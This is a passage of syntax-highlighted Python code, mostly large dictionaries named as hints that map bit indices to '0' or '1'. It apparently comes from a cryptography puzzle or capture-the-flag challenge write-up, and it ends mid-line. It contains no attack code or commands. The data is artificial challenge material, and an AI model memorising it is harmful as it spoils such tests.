class="string">&#x27;0&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">469</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">451</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">438</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">203</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">121</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">494</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">399</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">314</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">183</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">492</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">246</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">108</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">379</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">460</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">56</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">372</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">313</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">237</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">12</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">204</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">80</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">339</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">296</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">483</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">402</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">67</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">338</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">116</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">406</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">218</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">115</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">301</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">490</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">502</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">343</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">46</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">321</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">231</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">88</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">404</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">426</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">344</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">123</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">463</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">45</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">461</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">229</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">28</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">274</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">134</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">104</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">21</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">256</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">471</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">157</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">217</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">158</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">307</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">255</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">386</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">373</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">114</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">360</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">148</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">383</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">19</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">472</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">201</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">262</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">221</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">310</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">352</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">224</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">185</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">214</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">285</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">410</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">455</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">445</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">464</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">284</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">503</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">298</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">449</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">477</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">376</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">133</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">177</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">210</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">364</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">163</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">213</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">295</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">111</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">458</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">146</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">244</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">261</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">508</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">106</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">112</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">120</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">156</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">303</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">259</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">35</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">444</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">215</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">304</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">140</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">351</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">443</span>: <span class="string">&#x27;0&#x27;</span>&#125;</span><br><span class="line">    hint3 = &#123;<span class="number">891</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">74</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">129</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">477</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">880</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">57</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">473</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">289</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">361</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1012</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">529</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">294</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">174</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">500</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">257</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">392</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">405</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">11</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">763</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">637</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">564</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">941</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">923</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1014</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">670</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">558</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">304</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">444</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">716</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">208</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">130</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">634</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">661</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">862</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">412</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">796</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">761</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">113</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">752</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">818</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">797</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">390</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">337</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">133</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">367</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">470</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">345</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">170</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">312</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">624</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">53</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">75</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">281</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">522</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">100</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">554</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">583</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">836</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">715</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">450</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">484</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">876</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">165</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">842</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">62</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">442</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">927</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">586</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">399</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">227</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">886</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">663</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">947</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">906</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">377</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">246</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">365</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">177</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">59</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">63</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">936</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">144</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">416</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">228</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">366</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">117</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">78</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">717</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">800</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">47</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">80</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">34</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">662</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">970</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">986</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">287</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">597</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">783</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">805</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">112</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">671</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">540</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">153</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">577</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">543</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">414</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">123</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">626</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">452</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">810</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">905</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">602</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">537</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">374</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">408</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">434</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">137</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">532</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">397</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">333</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">258</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">359</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">134</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">322</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">653</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1018</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">639</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">40</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">826</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">489</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">5</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">858</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">516</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">149</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">945</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">106</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">694</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">221</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">207</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">186</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">316</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">449</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">297</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">276</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">103</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">437</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">802</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">108</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">921</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">427</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">728</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">879</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">953</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">459</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">37</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">559</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">610</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">341</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">299</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">952</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">201</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">327</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">741</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">253</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">310</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">946</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">696</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">398</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">266</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">829</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">908</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">469</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">873</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">658</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">798</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">621</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">238</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">654</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">205</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">925</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">391</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">480</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">4</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">598</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">677</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">142</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">606</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">118</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">164</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">973</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">347</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">159</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">307</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">83</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">668</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">675</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">924</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">191</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">890</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">352</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">965</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">692</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">782</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">817</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">889</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">515</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">433</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">356</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">845</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">104</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">979</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">426</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">785</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">546</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">55</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">824</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">704</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">510</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">710</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1022</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">647</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">465</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">245</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">850</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">657</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1007</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">807</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">158</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">328</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">292</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">355</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">596</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">275</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">371</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">1004</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">594</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">384</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">446</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">994</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">616</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">317</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">305</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">151</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">400</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">900</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">203</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">563</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">745</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">536</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">726</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">751</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">402</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">116</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">781</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">988</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">768</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">688</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">954</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">976</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">868</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">723</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">131</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">794</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">513</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">914</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">641</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">319</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">629</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">620</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">711</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">601</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">531</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">393</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">168</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">132</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">950</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">488</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">679</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">568</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">43</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">545</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">217</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">680</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">501</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">1008</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">514</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">746</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">187</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">436</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">336</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">139</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">338</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">695</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">300</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">584</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">152</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">828</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">251</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">691</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">296</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">128</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">394</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">655</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">544</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">313</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">565</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">685</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">720</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">178</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">667</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">403</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">697</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">138</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">659</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">960</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">454</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">271</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">33</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">295</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">600</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">579</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">68</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">211</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">82</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">114</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">209</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">226</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">753</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">874</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">903</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">358</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">141</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">236</span>: <span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span 